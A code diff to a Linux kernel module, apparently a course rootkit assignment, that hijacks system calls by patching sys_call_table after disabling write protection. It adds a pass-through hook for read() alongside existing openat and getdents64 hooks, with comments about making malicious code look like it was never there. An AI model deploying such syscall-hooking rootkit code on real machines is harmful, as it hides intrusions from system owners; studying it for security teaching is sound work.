@@ -47,6 +47,10 @@ int disable_page_rw(void *ptr)
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
 //    should expect it find its arguments on the stack (not in registers).
 
+//*****************
+// openat         
+//*****************
+
 asmlinkage int (*original_openat)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
@@ -61,6 +65,9 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+//*****************
+//  getdents64
+//*****************
 asmlinkage int (*original_getdents64)(struct pt_regs *regs);
 
 asmlinkage int sneaky_getdents64(struct pt_regs *regs)
@@ -95,6 +102,21 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
   return nread;
 }
 
+//*****************
+//  read
+//*****************
+
+asmlinkage int (*original_read)(struct pt_regs *regs);
+asmlinkage int sneaky_read(struct pt_regs *regs)
+{
+  int fd = (int)regs->di;
+  char __user *buf = (char __user *)regs->si;
+  size_t count = (size_t)regs->dx;
+  int nread = (*original_read)(regs);
+  
+  return nread;
+}
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -110,14 +132,14 @@ static int initialize_sneaky_module(void)
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
-
+  original_read = (void *)sys_call_table[__NR_read];
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
 
   //  You need to replace other system calls you need to hack here
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
-
+  sys_call_table[__NR_read] = (unsigned long)sneaky_read;
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
@@ -135,7 +157,7 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-
+  sys_call_table[__NR_read] = (unsigned long)original_read;
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 }
